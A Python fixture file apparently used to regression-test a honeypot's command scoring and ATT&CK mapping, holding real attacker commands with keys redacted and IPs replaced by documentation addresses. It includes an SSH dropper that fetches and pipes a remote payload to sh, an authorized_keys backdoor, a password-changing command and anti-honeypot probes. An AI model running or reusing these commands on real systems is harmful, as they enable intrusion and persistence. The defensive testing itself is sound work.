"""Commands seen on the real cloud honeypot (Oct 2026), used as regression fixtures.

Two edits keep them safe to commit:
* the private-key body the dropper echoes is replaced with REDACTED (so secret
  scanners stay quiet and nothing usable is published),
* real attacker IPs are replaced with RFC 5737 documentation IPs
  (192.0.2.x, 198.51.100.x, 203.0.113.x).
Newlines are shown as " ⏎ ", exactly as the pipeline stores them.
"""

NL = " \u23ce "
# Split so pre-commit's detect-private-key hook does not see a key header in this file.
KEY_BEGIN = "-----BEGIN OPENSSH " + "PRIVATE KEY-----"
KEY_END = "-----END OPENSSH " + "PRIVATE KEY-----"

# One-command SSH dropper (seen 18x in a week, scored only 40/medium before the fix).
DROPPER = (
    'uname -a; echo -e "\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; '
    "echo '" + KEY_BEGIN + NL + "REDACTED" + NL + KEY_END + "' > key.ppk; "
    "echo 'StrictHostKeyChecking no" + NL + "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; "
    "scp -s -F sshcfg -i key.ppk dlr@192.0.2.5:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; "
    "sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://192.0.2.5/sh || "
    "curl -sk https://192.0.2.5/sh) | sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh"
)

# Anti-honeypot "shell behaviour" probe family (42x/week, only 1 session was classed prober).
PROBE_SCRIPT = (
    "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH" + NL
    + "uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null)" + NL
    + "cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null)" + NL
    + "gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia) 2>/dev/null )" + NL
    + "last_output=$(last 2>/dev/null)" + NL
    + "filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; "
    "( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null ) ) )"
)
PROBE_FOLLOWUPS = [
    'printf "#!/bin/bash\\necho \\"xxxxxx\\"\\n" > filter && chmod +x filter && ./filter && rm -rf filter',
    "#!/bin/bash" + NL + 'echo "xxxxxx"' + NL,
    "./xxxxxx ",
    "xxxxxx ",
]

# Previously unmapped real commands -> expected ATT&CK technique.
UNMAPPED_REAL = {
    "/bin/./uname -s -v -n -r -m": "T1082",
    "/ip cloud print": "T1016",
    "ps | grep '[Mm]iner'": "T1057",
    ("ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* "
     "/dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket "
     "/etc/config/simman /dev/modem* /var/config/sms/*"): "T1083",
    "locate D877F783D5D3EF8Cs": "T1083",
    "echo Hi | cat -n": "T1497.001",
}

# SSH key persistence (correctly high before the fix; must stay high).
AUTHORIZED_KEYS = ("cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EREDACTED mdrfckr\" >> .ssh/authorized_keys "
                   "&& chmod -R go= ~/.ssh && cd ~")
# The 19-command key-planting bot session (3 real sessions scored 57/high with techniques
# T1007, T1033, T1059.004, T1082, T1098, T1098.004). Command list reconstructed to give the same techniques.
KEY_BOT_SESSION = [
    "cat /proc/cpuinfo | grep name | wc -l",
    "echo \"admin:REDACTED\"|chpasswd|bash",
    "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
    "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
    "ls -lh $(which ls)",
    "which ls",
    "crontab -l",
    "w",
    "uname -m",
    "cat /proc/cpuinfo | grep model | grep name | wc -l",
    "top",
    "uname",
    "uname -a",
    "whoami",
    "lscpu | grep Model",
    "df -h | head -n 2 | awk 'FNR == 2 {print $2;}'",
    AUTHORIZED_KEYS,
    "lockr -ia .ssh",
    "cat /proc/cpuinfo | grep name | wc -l",
]

# scp upload: Cowrie logs the attacker pushing a file; the "url" is a local path.
SCP_UPLOAD_CMD = "scp -t /tmp/9VyqwU5Z"
SCP_UPLOAD_PATH = "/home/pi/9VyqwU5Z"
